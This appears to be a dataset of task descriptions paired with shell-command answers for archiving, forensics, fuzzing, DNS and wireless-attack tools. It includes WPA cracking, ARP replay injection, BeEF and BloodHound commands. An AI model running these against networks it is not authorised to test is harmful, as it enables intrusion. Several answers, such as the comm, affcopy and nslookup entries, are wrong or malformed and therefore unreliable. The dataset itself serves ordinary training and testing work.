{"input": "Extract files from \"archive.7z\" to the \"output\" directory, overwriting any existing files without prompting", "answer": "7z x archive.7z -ooutput -aoa"}
{"input": "Benchmark the compression performance of 7z using default settings", "answer": "7z b"}
{"input": "Create an SFX (self-extracting) archive \"installer.exe\" from the \"setup\" folder", "answer": "7z a -sfx installer.exe setup/"}
{"input": "Add files to \"archive.7z\" while storing symbolic links as links instead of their target files", "answer": "7z a archive.7z * -snl"}
{"input": "Add all files in the current directory to an archive named \"backup.7z\" using the maximum compression level", "answer": "7za a -mx9 backup.7z ."}
{"input": "List all files in the archive \"archive.7z\" with technical details", "answer": "7za l -slt archive.7z"}
{"input": "Extract files from the archive \"archive.7z\" to the current directory without preserving the directory structure", "answer": "7za e archive.7z"}
{"input": "Exclude all files with the \".log\" extension when adding files to the archive \"archive.7z\"", "answer": "7za a archive.7z . -x!*.log"}
{"input": "Benchmark the compression performance of 7-Zip using the default settings", "answer": "7za b"}
{"input": "Show information about the supported archive formats in 7-Zip", "answer": "7za i"}
{"input": "Extract files from the archive \"archive.7z\" to the \"output\" directory and disable the progress indicator", "answer": "7za x archive.7z -ooutput -bd"}
{"input": "Create an archive named \"backup.7z\" and store symbolic links as links instead of their target files", "answer": "7za a -snl backup.7z ."}
{"input": "Extract files from \"data.7z\" without preserving directory names and overwrite existing files", "answer": "7zr e data.7z -aoa"}
{"input": "Extract files from \"archive.7z\" to the current directory, assuming \"Yes\" to all prompts", "answer": "7zr x archive.7z -y"}
{"input": "Extract files from \"archive.7z\" while excluding all `.tmp` files", "answer": "7zr x archive.7z -x!*.tmp"}
{"input": "List all contents of the archive \"archive.7z\" with technical details", "answer": "7zz l -slt archive.7z"}
{"input": "Update the archive \"project.7z\" with newer versions of files in the \"src\" directory", "answer": "7zz u project.7z src"}
{"input": "Extract files from the archive \"encrypted.7z\" using the password \"secure123\"", "answer": "7zz x encrypted.7z -psecure123"}
{"input": "Exclude all `.log` files while adding files from the \"logs\" directory to the archive \"logs.7z\"", "answer": "7zz a logs.7z logs -x!*.log"}
{"input": "Extract files from the archive \"data.7z\" without preserving directory structure", "answer": "7zz e data.7z"}
{"input": "Compress the \"project\" directory into a self-extracting archive named \"project.exe\"", "answer": "7zz a -sfx project.exe project"}
{"input": "Analyze a traffic dump named `vlan_traffic.pcap` to search for VLAN tags", "answer": "tshark -r vlan_traffic.pcap -Y \"vlan\""}
{"input": "Search for AES keys in the memory dump `crash_dump.img` and allow up to 15 bit errors in the candidate key schedule", "answer": "aeskeyfind -t 15 crash_dump.img"}
{"input": "List all segment names in the AFF image file \"disk_image.aff\" without displaying their contents", "answer": "affcat -l disk_image.aff"}
{"input": "Output the contents of the AFF image file \"evidence.aff\" quietly, without printing skipped pages to stderr", "answer": "affcat -q evidence.aff"}
{"input": "Output the contents of the AFF image file \"disk.aff\" and notify when pages are skipped during the process", "answer": "affcat -n disk.aff"}
{"input": "Compare the contents of `file1.aff` and `file2.aff` and print all matching segments", "answer": "comm -12 <(sort file1.aff) <(sort file2.aff)"}
{"input": "Copy an AFF file named \"image.aff\" to a new file named \"image_copy.aff\" and overwrite the destination file if it already exists", "answer": "affcopy image.aff image_copy.aff"}
{"input": "Copy an AFF file named \"evidence.aff\" to a new file named \"evidence_copy.aff\" and skip both read and write verifications", "answer": "affcopy -x -y evidence.aff evidence_copy.aff"}
{"input": "Check if \"mypass\" is the correct passphrase for the file \"evidence.aff\"", "answer": "affcrypto -p mypass evidence.aff"}
{"input": "List the installed hash and encryption algorithms supported by affcrypto", "answer": "affcrypto -l"}
{"input": "Verify the diskprint AFF structure of the file \"system_image.aff\" using the XML file \"check.xml\"", "answer": "affdiskprint -x check.xml system_image.aff"}
{"input": "Print information about the AFF file \"evidence.aff\" and validate the hash of each page if present", "answer": "affinfo -a -v evidence.aff"}
{"input": "Print information about the AFF file \"image.aff\" and validate the MD5 hash of the entire file, while also printing bad block details", "answer": "affinfo -a -b -m image.aff"}
{"input": "Print information about the AFF file \"disk_image.aff\" and validate the hash of each page, while also printing binary values in hex", "answer": "affinfo -a -v -x disk_image.aff"}
{"input": "Print information about the AFF file \"forensic.aff\" and validate the MD5 hash of the entire file, while also printing bad block details and using wide output", "answer": "affinfo -a -b -m -w forensic.aff"}
{"input": "Print information about the AFF file \"data.aff\" and validate the SHA1 hash of the entire file, while also printing binary values in hex and using wide output", "answer": "affinfo -a -S -x -w data.aff"}
{"input": "Print the contents of the segment named \"metadata\" from the AFF file \"data.aff\"", "answer": "affsegment -pmetadata data.aff"}
{"input": "Sign an existing AFF file named \"evidence.aff\" using a private key stored in \"private.key\" and a certificate in \"certificate.cer\"", "answer": "affsign -k private.key -c certificate.cer evidence.aff"}
{"input": "Remove all signature segments from the AFF file \"data.aff\" to reset its signing status", "answer": "affsign -Z data.aff"}
{"input": "Generate statistics for multiple AFF files, \"disk1.aff\" and \"disk2.aff,\" and display the output in megabytes", "answer": "affstats -m disk1.aff disk2.aff"}
{"input": "Check the statistics for an AFF file named \"backup.aff\" and ensure the output is in megabytes for better readability", "answer": "affstats -m backup.aff"}
{"input": "Print statistics for all AFF files in the current directory, with the output in megabytes", "answer": "affstats -m *.aff"}
{"input": "Analyze the AFF file \"suspicious.aff\" and display its statistics without converting to megabytes", "answer": "affstats suspicious.aff"}
{"input": "Generate statistics for the AFF file \"archive.aff\" and display the output in megabytes for easier interpretation", "answer": "affstats -m archive.aff"}
{"input": "Mount an AFF container located at `/path/to/container.aff` with debug output enabled and allow access to other users", "answer": "affuse -d -o allow_other /path/to/container.aff /mnt/aff"}
{"input": "Mount an AFF container at `/images/disk.aff` with direct I/O enabled, a maximum read size of 64KB, and a cache timeout for attributes set to 5 seconds", "answer": "affuse -o direct_io -o max_read=65536 -o attr_timeout=5 /images/disk.aff /mnt/disk"}
{"input": "Verify the digital signature on \"data.aff\" while printing all segments and enabling verbose output", "answer": "affverify -a -v data.aff"}
{"input": "Extract and output XML for the segments \"file_metadata\" and \"disk_info\" from the AFF file \"system_image.aff\"", "answer": "affxml -j file_metadata -j disk_info system_image.aff"}
{"input": "Add all seed files from the directory `/home/user/seeds` to an AFL++ fuzzing campaign with the output directory `/opt/afl-output`", "answer": "afl-addseeds -o /opt/afl-output -i /home/user/seeds"}
{"input": "Analyze the input file `crash_input` using afl-analyze in QEMU mode for the target application `/home/user/app/binary`", "answer": "afl-analyze -i crash_input -Q -- /home/user/app/binary"}
{"input": "Analyze the input file `test_case.bin` with afl-analyze in Unicorn mode for the target application `/opt/bin/target`", "answer": "afl-analyze -i test_case.bin -U -- /opt/bin/target"}
{"input": "Analyze the input file `input.txt` with afl-analyze in Nyx mode for the target application `/usr/local/bin/app`", "answer": "afl-analyze -i input.txt -X -- /usr/local/bin/app"}
{"input": "Analyze the input file `data.bin` with afl-analyze, using Wine mode and a memory limit of 100 MB for the target application `/home/user/wine_app.exe`", "answer": "afl-analyze -i data.bin -W -m 100 -- /home/user/wine_app.exe"}
{"input": "Analyze the input file `exploit.bin` with afl-analyze, using a timeout of 3000 milliseconds and edge coverage only for the target application `/opt/bin/vuln_app`", "answer": "afl-analyze -i exploit.bin -t 3000 -e -- /opt/bin/vuln_app"}
{"input": "Compile a C++ source file `main.cpp` using afl-c++ with all warnings enabled and treat warnings as errors", "answer": "afl-c++ -Wall -Werror main.cpp -o main"}
{"input": "Compile a C++ source file named `example.cpp` using afl-cc with all optimizations enabled and include debug information", "answer": "afl-cc -O3 -g example.cpp -o example"}
{"input": "Compile a C++ source file `test.cpp` using afl-clang++ with debug information and coverage mapping enabled for fuzzing", "answer": "afl-clang++ -g -fcoverage-mapping -o test test.cpp"}
{"input": "Compile a C source file `vulnerable.c` using afl-clang with stack protection and address sanitizer enabled for security testing", "answer": "afl-clang -fstack-protector-strong -fsanitize=address -o vulnerable vulnerable.c"}
{"input": "Compile a C++ source file named `example.cpp` using `afl-clang++` with all optimizations enabled and include debugging information", "answer": "afl-clang++ -O3 -g example.cpp -o example"}
{"input": "Compile a C++ source file named `main.cpp` using `afl-clang++` with Link-Time Optimization (LTO) enabled and output the result to `main`", "answer": "afl-clang++ -flto main.cpp -o main"}
{"input": "Compile a C++ source file named `main.cpp` using `afl-clang++` with fuzzing instrumentation and output the result to `main`, while also enabling stack protection", "answer": "afl-clang++ -fstack-protector-strong main.cpp -o main"}
{"input": "Compile a C source file named `test.c` using `afl-clang-fast` with AddressSanitizer enabled to detect memory errors", "answer": "afl-clang-fast -fsanitize=address test.c -o test"}
{"input": "Compile a C++ source file named `app.cpp` using `afl-clang-fast` with all warnings enabled and treat warnings as errors", "answer": "afl-clang-fast -Wall -Werror app.cpp -o app"}
{"input": "Compile a C source file named `test.c` using `afl-clang-fast` with stack protection disabled and output the result to `test`", "answer": "afl-clang-fast -fno-stack-protector test.c -o test"}
{"input": "Compile a C++ source file `example.cpp` with AFL's LTO instrumentation for fuzzing, enabling all optimizations and generating debug information", "answer": "afl-clang-lto++ -O3 -g -o example example.cpp"}
{"input": "Compile a C++ source file `test.cpp` with AFL's LTO instrumentation, enabling coverage mapping and disabling exceptions for fuzzing", "answer": "afl-clang-lto++ -fcoverage-mapping -fno-exceptions -o test test.cpp"}
{"input": "Compile a C++ source file `fuzz_target.cpp` with AFL's LTO instrumentation, enabling LTO in full mode and generating a static library", "answer": "afl-clang-lto++ -flto=full -c fuzz_target.cpp -o fuzz_target.o && ar rcs fuzz_target.a fuzz_target.o"}
{"input": "Compile a C++ source file `target.cpp` with AFL's LTO instrumentation, enabling stack protection and generating verbose assembly output", "answer": "afl-clang-lto++ -fstack-protector -fverbose-asm -o target target.cpp"}
{"input": "Compile a C++ source file `fuzz.cpp` with AFL's LTO instrumentation, enabling LTO in thin mode and specifying the number of LTO jobs to 4", "answer": "afl-clang-lto++ -flto=thin -flto-jobs=4 -o fuzz fuzz.cpp"}
{"input": "Compile a C++ source file `main.cpp` with AFL's LTO instrumentation, enabling LTO in auto mode and generating a shared library", "answer": "afl-clang-lto++ -flto=auto -shared -o libmain.so main.cpp"}
{"input": "Compile a C++ source file `fuzz_main.cpp` with AFL's LTO instrumentation, enabling LTO in jobserver mode and generating a position-independent executable", "answer": "afl-clang-lto++ -flto=jobserver -fPIE -o fuzz_main fuzz_main.cpp"}
{"input": "Compile a C++ source file `example.cpp` with AFL's LTO instrumentation, enabling LTO in full mode and generating a fat LTO object", "answer": "afl-clang-lto++ -flto=full -ffat-lto-objects -o example example.cpp"}
{"input": "Minimize the corpus in `/test_input` and save the results to `/test_output`, using unicorn-based instrumentation", "answer": "afl-cmin -i /test_input -o /test_output -U -- /path/to/target_app"}
{"input": "Minimize the corpus in `/input_dir` and save the results to `/output_dir`, setting a timeout of 10 seconds for the child process", "answer": "afl-cmin -i /input_dir -o /output_dir -t 10000 -- /path/to/target_app"}
{"input": "Fuzz a text-based application located at `/usr/bin/text_app` with a dictionary file `text_dict.txt` and limit the memory usage of the child process to 50 MB. Use the input directory `text_inputs/` and output directory `text_results/`", "answer": "afl-fuzz -i text_inputs/ -o text_results/ -x text_dict.txt -m 50 -- /usr/bin/text_app"}
{"input": "Fuzz a binary application at `/usr/bin/binary_app` with a fixed seed of 12345 for the random number generator and use the exploit mutation strategy. Use the input directory `binary_inputs/` and output directory `binary_results/`", "answer": "afl-fuzz -i binary_inputs/ -o binary_results/ -s 12345 -P exploit -- /usr/bin/binary_app"}
{"input": "Fuzz a binary application at `/usr/bin/app` with a power schedule focused on rare paths and a dictionary file `dict.txt`. Use the input directory `inputs/` and output directory `results/`", "answer": "afl-fuzz -i inputs/ -o results/ -p rare -x dict.txt -- /usr/bin/app"}
{"input": "Compile a C++ source file named `app.cpp` with afl-g++ and link it as a shared library", "answer": "afl-g++ -shared -o libapp.so app.cpp"}
{"input": "Compile a C++ source file named `app.cpp` with afl-g++ and display the directories in the compiler's search path", "answer": "afl-g++ -print-search-dirs && afl-g++ -o app app.cpp"}
{"input": "Compile a C++ source file named `app.cpp` into an executable named `app` using afl-g++-fast, and pass additional options to the linker to create a position-independent executable", "answer": "afl-g++-fast -pie -o app app.cpp"}
{"input": "Compile a C++ source file named `source.cpp` into an executable named `source` using afl-g++-fast, and pass additional options to the assembler", "answer": "afl-g++-fast -Wa,-march=native -o source source.cpp"}
{"input": "Compile a C++ source file named `demo.cpp` into an executable named `demo` using afl-g++-fast, and override the built-in specs with a custom specs file", "answer": "afl-g++-fast -specs=custom.specs -o demo demo.cpp"}
{"input": "Compile a C program named `app.c` using afl-gcc and create a position-independent executable", "answer": "afl-gcc -pie -o app app.c"}
{"input": "Compile a C source file named `example.c` into an executable named `example` using `afl-gcc-fast` and enable position-independent executable (PIE) for enhanced security", "answer": "afl-gcc-fast -o example example.c -pie"}
{"input": "Compile a C source file named `app.c` into an executable named `app` and display the version of the compiler being used", "answer": "gcc -o app app.c && gcc -dumpversion"}
{"input": "Link a set of object files into a shared library, ensuring that all symbols are included in the dynamic symbol table", "answer": "gcc -shared -o libexample.so file1.o file2.o -Wl,--export-dynamic"}
{"input": "Link an executable with a custom entry point and enable LTO (Link-Time Optimization) with full optimization", "answer": "gcc -flto -O3 -Wl,--entry=my_entry -o custom_entry_exe file1.o file2.o"}
{"input": "Generate a build ID for an executable and compress debug sections using zlib", "answer": "gcc -o build_id_exe file1.o file2.o -Wl,--build-id -Wl,--compress-debug-sections=zlib"}
{"input": "Link a shared library with a custom soname and ensure that all symbols are bound locally", "answer": "gcc -shared -Wl,-soname,libcustom.so -Wl,-Bsymbolic -o libcustom.so file1.o file2.o"}
{"input": "Create a relocatable object file from multiple input object files", "answer": "ld -r -o relocatable.o file1.o file2.o"}
{"input": "Link an executable with a custom section start address for the `.text` section", "answer": "ld -Ttext 0x10000 -o custom_text_exe file1.o file2.o"}
{"input": "Compile a C++ source file named `program.cpp` with afl-lto, enabling the static analyzer to check for potential issues in the code", "answer": "afl-clang-lto++ program.cpp -o program"}
{"input": "Compile a C++ source file named `example.cpp` with afl-lto, enabling the generation of debug information with DWARF version 5", "answer": "afl-lto -gdwarf-5 example.cpp -o example"}
{"input": "Compile a C++ source file named `example.cpp` using afl-lto++ with LTO (Link Time Optimization) enabled and output the result to `example.o`", "answer": "afl-lto++ -flto -o example.o example.cpp"}
{"input": "Compile a C++ source file named `program.cpp` using afl-lto++ with LTO enabled and disable the use of the integrated assembler", "answer": "afl-lto++ -flto -fno-integrated-as -o program.o program.cpp"}
{"input": "Compile a C++ source file named `module.cpp` using afl-lto++ with LTO enabled and specify the module cache path for intermediate files", "answer": "afl-lto++ -flto -fmodules-cache-path=/tmp/module-cache -o module.o module.cpp"}
{"input": "Compile a C++ source file named `network.cpp` using afl-lto++ with LTO enabled and enable the generation of a dependency file", "answer": "afl-lto++ -flto -MD -MF network.d -o network.o network.cpp"}
{"input": "Connect to the AFL proxy server running on host 192.168.1.100 at port 8080 with the default input size", "answer": "afl-network-client 192.168.1.100 8080"}
{"input": "Connect to the AFL proxy server on host 10.10.10.10 at port 12345 with the default input size", "answer": "afl-network-client 10.10.10.10 12345"}
{"input": "Start the afl-network-server on port 7070 with a timeout of 1500 milliseconds, using QEMU mode, and target the application at /bin/test_binary", "answer": "afl-network-server -p 7070 -T 1500 -Q -- /bin/test_binary"}
{"input": "Generate AFL fuzzer plots from the directory `/opt/afl/output` and save the resulting graphs to `/opt/afl/plots` without any graphical display", "answer": "afl-plot /opt/afl/output /opt/afl/plots"}
{"input": "Analyze a target application at `/usr/bin/target_app` using afl-showmap with Unicorn mode, set a memory limit of 50 MB, and suppress program output", "answer": "afl-showmap -U -m 50 -q -- /usr/bin/target_app"}
{"input": "Run afl-showmap on `/usr/bin/target_app` with a timeout of 5000 milliseconds, save the trace data to `timeout_trace.txt`, and show real tuple values instead of AFL filter values", "answer": "afl-showmap -o timeout_trace.txt -t 5000 -r -- /usr/bin/target_app"}
{"input": "Minimize the input test case `input.txt` for the target application `/path/to/target_app` and save the minimized output to `output.txt`, ensuring the tool uses QEMU mode for binary-only instrumentation", "answer": "afl-tmin -i input.txt -o output.txt -Q -- /path/to/target_app"}
{"input": "Minimize the test case `hang_input.bin` for the application `/opt/apps/hang_app` and save the output to `minimized_hang.bin`, focusing on minimizing a hang condition", "answer": "afl-tmin -i hang_input.bin -o minimized_hang.bin -H -- /opt/apps/hang_app"}
{"input": "Reduce the size of the input file `large_input.dat` for the target application `/usr/local/bin/target` and save the minimized output to `small_input.dat`, using a timeout of 5000 milliseconds for each run", "answer": "afl-tmin -i large_input.dat -o small_input.dat -t 5000 -- /usr/local/bin/target"}
{"input": "Check the status of all fuzzers in the AFL output directory, including dead fuzzers, and display minimal stats without color output", "answer": "afl-whatsup -d -m -n /path/to/afl_output_directory"}
{"input": "Provide a summary of the AFL fuzzing results in the specified directory, skipping detailed information and excluding dead fuzzers", "answer": "afl-whatsup -s /path/to/afl_output_directory"}
{"input": "Crack a WPA-PSK network using an airolib-ng database named `wpa.db` instead of a wordlist", "answer": "aircrack-ng -a 2 -r wpa.db capture-01.cap"}
{"input": "Decrypt a WEP-encrypted pcap file named \"wep_capture.pcap\" using the WEP key \"1234567890\" and save the corrupted packets to \"bad_wep_packets.pcap\"", "answer": "airdecap-ng -w 1234567890 -c bad_wep_packets.pcap wep_capture.pcap"}
{"input": "Decrypt a WEP-encrypted pcap file named \"wep_traffic.pcap\" for the access point with MAC address \"00:11:22:33:44:55\" using the WEP key \"abcdef1234\"", "answer": "airdecap-ng -b 00:11:22:33:44:55 -w abcdef1234 wep_traffic.pcap"}
{"input": "Remove WEP cloaked frames from the input file \"capture.pcap\" and filter based on the BSSID \"00:11:22:33:44:55\". Save the valid packets to \"output-valid.pcap\" and the cloaked packets to \"output-cloaked.pcap\"", "answer": "airdecloak-ng -i capture.pcap --bssid 00:11:22:33:44:55 -o output-valid.pcap -c output-cloaked.pcap"}
{"input": "Replay ARP requests captured from the file arp.pcap to the access point with the MAC address 00:11:22:33:44:55 using the wireless interface wlan0", "answer": "aireplay-ng --arpreplay -r arp.pcap -a 00:11:22:33:44:55 wlan0"}
{"input": "Test the injection capability and quality of the wireless interface wlan0 by sending packets to the access point with the MAC address 00:11:22:33:44:55", "answer": "aireplay-ng --test -a 00:11:22:33:44:55 wlan0"}
{"input": "Check for any processes that might interfere with the wireless interface `wlan0` using airmon-ng", "answer": "airmon-ng check wlan0"}
{"input": "Start monitoring mode on the wireless interface `wlan0` and set it to operate on the 2.4 GHz frequency band using airmon-ng", "answer": "airmon-ng start wlan0"}
{"input": "Update the IEEE OUI list for airodump-ng to ensure the latest vendor information is available", "answer": "airodump-ng-oui-update"}
{"input": "Display statistics about the database, such as the number of ESSIDs and passwords stored", "answer": "airolib-ng wpa_db --stats"}
{"input": "Import a cowpatty file named `cowpatty_pmks.cow` into the database", "answer": "airolib-ng wpa_db --import cowpatty cowpatty_pmks.cow"}
{"input": "Launch a wireless card server on interface `wlan4` with debug level 1 and listen on port 7777", "answer": "airserv-ng -i wlan4 -d 1 -p 7777"}
{"input": "Configure a wireless card server on interface `wlan8` to operate on channel 9 and listen on port 4321", "answer": "airserv-ng -d wlan8 -c 9 -p 4321"}
{"input": "Use buddy-ng to perform a task while ensuring it does not drop privileges and display the help screen for additional guidance", "answer": "buddy-ng -p -h"}
{"input": "Merge two IVS files, `ivs_data1.ivs` and `ivs_data2.ivs`, into a single file named `combined.ivs`", "answer": "ivstools --merge ivs_data1.ivs ivs_data2.ivs combined.ivs"}
{"input": "Extract IVs from a pcap file named `traffic_log.pcap` and save the output to a file named `log_ivs.ivs`", "answer": "ivstools --convert traffic_log.pcap log_ivs.ivs"}
{"input": "Clean a WPA capture file \"network_traffic.cap\" and save the cleaned output to \"filtered_traffic.cap\"", "answer": "wpaclean filtered_traffic.cap network_traffic.cap"}
{"input": "Generate a Client to AP Relationship (CAPR) graph from the airodump-ng CSV file `capture.csv` and save the output as `capr_graph.png`", "answer": "airgraph-ng -i capture.csv -g CAPR -o capr_graph.png"}
{"input": "Create a Common Probe Graph (CPG) from the airodump-ng CSV file `probes.csv` and save the output as `cpg_graph.png`. Also, keep the intermediate DOT file", "answer": "airgraph-ng -i probes.csv -g CPG -o cpg_graph.png -d"}
{"input": "Visualize the Client to AP Relationship (CAPR) from the CSV file `network_data.csv` and save the graph as `network_graph.png`", "answer": "airgraph-ng -i network_data.csv -g CAPR -o network_graph.png"}
{"input": "Generate a Common Probe Graph (CPG) from the CSV file `wifi_data.csv` and save the output as `wifi_graph.png`. Do not keep the intermediate DOT file", "answer": "airgraph-ng -i wifi_data.csv -g CPG -o wifi_graph.png"}
{"input": "Create a Client to AP Relationship (CAPR) graph from the CSV file `capture_data.csv` and save the output as `capture_graph.png`. Keep the intermediate DOT file for further analysis", "answer": "airgraph-ng -i capture_data.csv -g CAPR -o capture_graph.png -d"}
{"input": "Generate a Common Probe Graph (CPG) from the CSV file `probe_data.csv` and save the output as `probe_analysis.png`", "answer": "airgraph-ng -i probe_data.csv -g CPG -o probe_analysis.png"}
{"input": "Visualize the Client to AP Relationship (CAPR) from the CSV file `network_capture.csv` and save the graph as `network_visualization.png`. Keep the intermediate DOT file", "answer": "airgraph-ng -i network_capture.csv -g CAPR -o network_visualization.png -d"}
{"input": "Generate a Common Probe Graph (CPG) from the CSV file `wifi_probes.csv` and save the output as `wifi_probes_graph.png`. Do not keep the intermediate DOT file", "answer": "airgraph-ng -i wifi_probes.csv -g CPG -o wifi_probes_graph.png"}
{"input": "Launch airgeddon with all available options enabled to perform a comprehensive wireless network audit", "answer": "airgeddon"}
{"input": "Start airgeddon with all features enabled to test the security of a wireless network", "answer": "airgeddon"}
{"input": "Execute airgeddon with all options turned on to perform a full wireless penetration test", "answer": "airgeddon"}
{"input": "Perform a full wireless network audit using airgeddon with all options enabled", "answer": "airgeddon"}
{"input": "Run airgeddon with all modules to assess the vulnerabilities of a Wi-Fi network in a real-world environment", "answer": "airgeddon"}
{"input": "Execute airgeddon with all options turned on to perform a full wireless penetration test in a real-world scenario", "answer": "airgeddon"}
{"input": "Use airgeddon with all functionalities to conduct a detailed wireless security analysis in a real-world environment", "answer": "airgeddon"}
{"input": "Test the IMAP service on the host `imap.example.com` using port 143 and a timeout of 6 seconds", "answer": "nmap -p 143 --script imap-capabilities --host-timeout 6s imap.example.com"}
{"input": "Launch BeEF with a custom configuration file located at `/etc/beef/config.yaml`", "answer": "beef-xss -c /etc/beef/config.yaml"}
{"input": "Stop the BeEF (Browser Exploitation Framework) service using the beef-xss-stop command", "answer": "sudo systemctl stop beef-xss"}
{"input": "After completing a penetration test, how do I stop the BeEF service to prevent further exploitation?", "answer": "sudo systemctl stop beef-xss"}
{"input": "What command should I use to stop the BeEF service if it was started accidentally?", "answer": "sudo systemctl stop beef-xss"}
{"input": "What command should I use to stop the BeEF service after completing a training exercise?", "answer": "sudo systemctl stop beef-xss"}
{"input": "Execute a caplet file named `scan.cap` located in the `/opt/caplets` directory", "answer": "bettercap -caplet /opt/caplets/scan.cap"}
{"input": "Create a DDNS key for the zone \"example.org\" using the HMAC-MD5 algorithm and name the key \"zone-key\"", "answer": "ddns-confgen -a hmac-md5 -k zone-key -z example.org"}
{"input": "Generate a DDNS key for the zone \"example.com\" using the default algorithm and name the key \"default-key\"", "answer": "ddns-confgen -k default-key -z example.com"}
{"input": "Generate a DDNS key for the zone \"test.org\" using the HMAC-SHA384 algorithm and name the key \"test-zone-key\"", "answer": "ddns-confgen -a hmac-sha384 -k test-zone-key -z test.org"}
{"input": "Import a DNSKEY record from a file named `example.key`, store it in the `/var/lib/bind/keys` directory, and set the key deletion date to December 31, 2024", "answer": "dnssec-importkey -K /var/lib/bind/keys -D 20241231 example.key"}
{"input": "Run the BIND named server in debug mode with a debug level of 3, using the configuration file `/etc/bind/named.conf`, and bind it to port 5353", "answer": "named -d 3 -c /etc/bind/named.conf -p 5353"}
{"input": "Convert the NZD file \"zone_data.nzd\" to NZF format so I can roll back to an older version of BIND", "answer": "named-nzd2nzf zone_data.nzd"}
{"input": "I want to convert the NZD file \"domain.nzd\" to NZF format for further analysis", "answer": "named-nzd2nzf domain.nzd"}
{"input": "List all supported DNS class names and standard record types using named-rrchecker", "answer": "named-rrchecker -C -T"}
{"input": "Perform a DNS lookup for the domain \"example.com\" and display all available information, including DNSSEC records and comments", "answer": "delv +all example.com"}
{"input": "Query the domain \"example.org\" using IPv4 only and show all details, including cryptographic fields and trust levels", "answer": "delv -4 +all example.org"}
{"input": "Query the SOA record for \"example.net\" and show all details, including DNSSEC records and validation traces", "answer": "delv +all example.net SOA"}
{"input": "Perform a DNS lookup for \"example.com\" and display all information, including debugging traces for the resolver", "answer": "delv +all +rtrace example.com"}
{"input": "Query the TXT records for \"example.org\" and show all details, including multiline formatting and cryptographic fields", "answer": "delv +all +multiline example.org TXT"}
{"input": "Perform a DNS lookup for \"example.com\" and display all information, including trust levels and unknown record formats", "answer": "delv +all +trust +unknownformat example.com"}
{"input": "Perform a reverse DNS lookup for the IP address 192.168.1.1 using `mdig`, and ensure the output includes all sections of the DNS response, such as question, answer, authority, and additional records", "answer": "mdig +all -x 192.168.1.1"}
{"input": "Perform a DNS lookup for the domain \"example.com\" using `mdig` and display all sections of the DNS response, but exclude the question section from the output", "answer": "mdig +all +noquestion example.com"}
{"input": "Perform a DNS lookup for the domain \"example.com\" using `mdig` and display all sections of the DNS response, but exclude authority records from the output", "answer": "mdig +all +noauthority example.com"}
{"input": "Print all the current nslookup settings and server details", "answer": "nslookup` followed by `set all` in interactive mode."}
{"input": "Retrieve all the current nslookup configuration details and server information", "answer": "nslookup` followed by `set all` in interactive mode."}
{"input": "View all the current nslookup settings and default server information", "answer": "nslookup` followed by `set all` in interactive mode."}
{"input": "Show all the current nslookup configuration options and server information", "answer": "nslookup` followed by `set all` in interactive mode."}
{"input": "Perform a DNS lookup for the domain \"example.com\" and display all available records", "answer": "host -a example.com"}
{"input": "Perform a DNS lookup for the domain \"example.com\" using IPv6 only", "answer": "host -6 example.com"}
{"input": "Perform a DNS lookup for the domain \"example.com\" and enable verbose output", "answer": "host -v example.com"}
{"input": "Revoke the DNSSEC key stored in the file `Kexample.net+005+54321.key` and specify the directory `/etc/bind/keys` for the key files", "answer": "dnssec-revoke -K /etc/bind/keys Kexample.net+005+54321.key"}
{"input": "Set the key publication date to January 1, 2024, for the DNSSEC key in the file `Kexample.org+008+67890.key`", "answer": "dnssec-settime -P 20240101 Kexample.org+008+67890.key"}
{"input": "Set the key inactivation date to February 15, 2024, for the DNSSEC key in `Kexample.info+008+77889.key`", "answer": "dnssec-settime -I 20240215 Kexample.info+008+77889.key"}
{"input": "Set the key deletion date to March 1, 2024, for the DNSSEC key in `Kexample.tech+013+22334.key`", "answer": "dnssec-settime -D 20240301 Kexample.tech+013+22334.key"}
{"input": "Verify the DNSSEC zone file \"example.org.zone\" with the origin set to \"example.org\" and ensure the input file format is text", "answer": "dnssec-verify -o example.org -I text example.org.zone"}
{"input": "Verify the DNSSEC zone file \"example.int.zone\" with the origin set to \"example.int\" and set the debug level to 2", "answer": "dnssec-verify -o example.int -v 2 example.int.zone"}
{"input": "Check the syntax of the BIND configuration file located at `/etc/bind/named.conf` and verify all zones", "answer": "named-checkconf -z /etc/bind/named.conf"}
{"input": "Validate the BIND configuration file `/etc/bind/named.conf` and change the root directory for relative paths to `/var/named`", "answer": "named-checkconf -t /var/named /etc/bind/named.conf"}
{"input": "Check the zone file `example.edu.zone` for the domain `example.edu` and treat all warnings as errors, ensuring strict validation", "answer": "named-checkzone -W fail example.edu example.edu.zone"}
{"input": "Validate the zone file `example.gov.zone` for the domain `example.gov` and ignore any missing reverse DNS (PTR) records", "answer": "named-checkzone -r ignore example.gov example.gov.zone"}
{"input": "Verify the zone file `example.mil.zone` for the domain `example.mil` and output the results in a relative format, showing only relative differences", "answer": "named-checkzone -s relative example.mil example.mil.zone"}
{"input": "Check the zone file `example.biz.zone` for the domain `example.biz` and treat all missing NSEC3 records as warnings", "answer": "named-checkzone -m warn example.biz example.biz.zone"}
{"input": "Validate the zone file `example.info.zone` for the domain `example.info` and output the results to a file named `results.txt`", "answer": "named-checkzone -o results.txt example.info example.info.zone"}
{"input": "Check the zone file `example.io.zone` for the domain `example.io` and ignore any missing glue records", "answer": "named-checkzone -i none example.io example.io.zone"}
{"input": "Validate the zone file \"example.com.zone\" for any errors, using the \"full\" style for serial numbers, and output the results to \"example.com.zone.bin\"", "answer": "named-compilezone -s full -o example.com.zone.bin example.com example.com.zone"}
{"input": "Convert the zone file \"example.com.zone\" to the \"raw\" output format, and save the result to \"example.com.zone.raw\"", "answer": "named-compilezone -F raw -o example.com.zone.raw example.com example.com.zone"}
{"input": "Compile the zone file \"example.com.zone\" into a binary format, using the \"local\" style for include directives, and save the output to \"example.com.zone.bin\"", "answer": "named-compilezone -i local -o example.com.zone.bin example.com example.com.zone"}
{"input": "Display the current status of the DNS server, including its operational state and statistics", "answer": "rndc status"}
{"input": "Generate a new rndc key with a custom key name \"secure_key\" and suppress the output of the key file path", "answer": "rndc-confgen -a -k secure_key -q"}
{"input": "Generate a new rndc key with a custom key length of 384 bits and configure it to connect to the DNS server running on port 953 at the address 192.168.0.1", "answer": "rndc-confgen -b 384 -p 953 -s 192.168.0.1"}
{"input": "Scan the file `firmware.bin` for embedded files, extract them, and save the extracted files to a custom directory named `extracted_files`", "answer": "binwalk -e -C extracted_files firmware.bin"}
{"input": "Scan the file `firmware.bin` for embedded files, extract them, and delete the carved files after extraction", "answer": "binwalk -e firmware.bin && rm -rf _firmware.bin.extracted"}
{"input": "Run BloodHound with all default collection methods to gather data from the domain 'example.local' and save the output to 'output.json'.\"", "answer": "bloodhound-python -d example.local -c All -o output.json"}
